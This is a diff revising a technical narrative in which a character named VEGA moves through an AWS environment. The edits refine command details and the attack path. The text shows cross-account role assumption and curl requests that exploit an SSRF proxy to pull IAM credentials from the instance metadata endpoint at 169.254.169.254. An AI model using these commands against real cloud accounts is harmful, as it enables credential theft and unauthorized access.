@@ -24,6 +24,7 @@ VEGA had already mapped the cross-account trust relationships. The `spoke-001` r
 aws sts assume-role \
     --role-arn arn:aws:iam::293847561029:role/spoke-001 \
     --role-session-name session-20250313 \
+    --duration-seconds 21600 \
     --profile meridian
 ```
 
@@ -57,24 +58,22 @@ aws ec2 describe-instances \
 -----------------------------------
 |       DescribeInstances          |
 +-------------------+--------------+
-| i-0a1b2c3d4e5f6g7 | optional    |
-| i-0h8i9j0k1l2m3n4 | optional    |
-| i-0o5p6q7r8s9t0u1 | required    |
-| i-0v2w3x4y5z6a7b8 | optional    |
+| i-0a1b2c3d4e5f6a78 | optional    |
+| i-0b8c9d0e1f2a3b4c | optional    |
+| i-0d5e6f7a8b9c0d1e | required    |
+| i-0f2a3b4c5d6e7f8a | optional    |
 +-------------------+--------------+
 
 ```
 
 Three out of four instances had `HttpTokens` set to `optional`: IMDSv1. That meant metadata credentials could be fetched without a session token, the same vulnerability class exploited in the 2019 Capital One breach via SSRF to `169.254.169.254`.
 
-Seven years later. Same misconfiguration.
+Six years later. Same misconfiguration.
 
-VEGA found his entry point through the assumed role session itself. The `dev-platform-012` spoke role had `ssm:StartSession` permissions, intended for developers to shell into instances without managing key pairs. VEGA used SSM Session Manager to open a shell on `i-0a1b2c3d4e5f6g7`, then found an internal dev tool on localhost with a URL parameter vulnerable to SSRF. No zero-day required.
+VEGA didn't need to be on the instance. The `dev-platform-012` account ran an internal dev tool — a lightweight proxy service on an EC2 instance with a URL parameter that accepted arbitrary targets. No authentication. No allowlist. VEGA hit it from his assumed role session through the VPC.
 
 ```bash
-aws ssm start-session --target i-0a1b2c3d4e5f6g7 --profile dev-platform-assumed
-# From inside the instance:
-curl "http://localhost:8080/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/dev-platform-role"
+curl "http://10.2.47.83:8080/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/dev-platform-role"
 ```
 
 ```json
